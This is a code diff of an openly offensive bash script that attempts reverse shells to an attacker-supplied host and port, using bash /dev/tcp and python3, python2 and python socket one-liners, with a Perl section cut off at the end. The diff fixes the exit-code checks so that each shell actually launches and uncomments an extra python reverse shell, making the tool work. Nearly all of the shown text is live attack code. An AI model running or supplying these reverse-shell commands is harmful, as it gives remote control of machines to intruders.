@@ -24,7 +24,7 @@ echo -e "\n${YELLOW}[+] 1. BASH${ENDCOLOR}"
 which bash > /dev/null 2>&1 
 a=$(echo $?)
 
-if [[ $a =~ 2 ]]
+if [[ $a =~ 0 ]]
 then
    echo -e "\n${GREEN}Bash Founded!${ENDCOLOR}\n"
    bash -i >& /dev/tcp/$1/$2 0>&1 2>/dev/null
@@ -38,13 +38,13 @@ echo -e "\n${YELLOW}[+] 2. PYTHON${ENDCOLOR}"
 which python > /dev/null 2>&1
 b=$(echo $?)
 
-if [[ $b =~ 2 ]]
+if [[ $b =~ 0 ]]
 then
    echo -e "\n${GREEN}Python Founded!${ENDCOLOR}\n"
    python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$1',$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" 2>/dev/null
    python2 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$1',$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" 2>/dev/null
 else
-#   python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$1',$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" > /dev/null 2>&1 
+   python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$1',$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" > /dev/null 2>&1 
    echo -e "${RED}Python not found${ENDCOLOR}"
 fi
 
@@ -53,7 +53,7 @@ echo -e "\n${YELLOW}[+] 3. PERL${ENDCOLOR}"
 which perl > /dev/null 2>&1
 c=$(echo $?)
 
-if [[ $c =~ 1 ]]
+if [[ $c =~ 0 ]]
 then
    echo -e "\n${GREEN}Perl Founded!${ENDCOLOR}\n"
    export pene=$1
